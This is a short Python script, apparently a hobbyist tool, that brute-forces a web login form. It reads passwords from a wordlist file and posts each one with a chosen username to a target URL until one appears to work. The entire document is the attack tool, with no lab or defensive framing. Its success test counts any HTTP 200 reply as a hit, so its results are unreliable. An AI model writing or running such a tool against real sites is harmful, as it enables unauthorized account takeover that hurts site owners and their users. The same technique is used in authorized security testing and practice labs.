import requests

url = input('[+] Enter the URL:  ')
username = input('[+] Enter the Username:  ')
password_file = input('[+] Enter the Password File:  ')

def cracking(username, url):
    with open(password_file, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            print('Trying: ' + password)
            data = {'username':username, 'password':password, 'Login':'submit'}            
            response = requests.post(url, data=data)
            if response.status_code != 200:
                print('[-] Failed: ' + password)
            else:
                print('[+] Found Username: ==> ' + username)
                print('[+] Password: ==> ' + password)
                return
    print('[!!] Password Not In List')

cracking(username, url)

